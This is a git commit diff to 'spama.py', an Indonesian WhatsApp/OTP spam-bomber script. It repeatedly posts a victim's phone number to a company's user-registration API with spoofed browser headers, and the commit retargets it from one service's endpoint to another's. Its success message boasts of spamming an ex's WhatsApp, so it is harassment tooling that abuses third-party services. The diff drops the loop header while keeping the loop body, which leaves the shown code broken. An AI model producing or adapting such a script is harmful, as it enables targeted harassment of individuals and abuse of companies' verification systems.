94d826fe4bc21a1ce17bd43a802fc45405153f2a
Ximon9d <116489872+Ximon9d@users.noreply.github.com>
2022-10-24 00:45:28 +0700

    Update spama.py

--- spama.py
+++ spama.py
@@ -1,20 +1,19 @@
-for k in range(jumlah):
   k += 1
   head = {
-  "Host": "api.qoalaplus.com",
+  "Host": "api.oyorooms.com",
   "content-length": "48",
   "accept": "application/json, text/plain, */*",
   "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
   "content-type": "application/json",
-  "origin": "https://www.qoalaplus.com",
+  "origin": "https://www.oyorooms.com",
   "sec-fetch-site": "same-site",
   "sec-fetch-mode": "cors",
   "sec-fetch-dest": "empty",
-  "referer": "https://www.qoalaplus.com/",
+  "referer": "https://www.oyorooms.com/",
   "accept-encoding": "gzip, deflate, br",
   "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
   data = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
-  pos = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=head,data=data).text
+  pos = requests.post("https://api.oyorooms.com/go-agent/v2/user/register",headers=head,data=data).text
   if "success" in pos:
     print("ANJAY SPAM WhatsApp Mantan Berhasil:)",k)
   else:
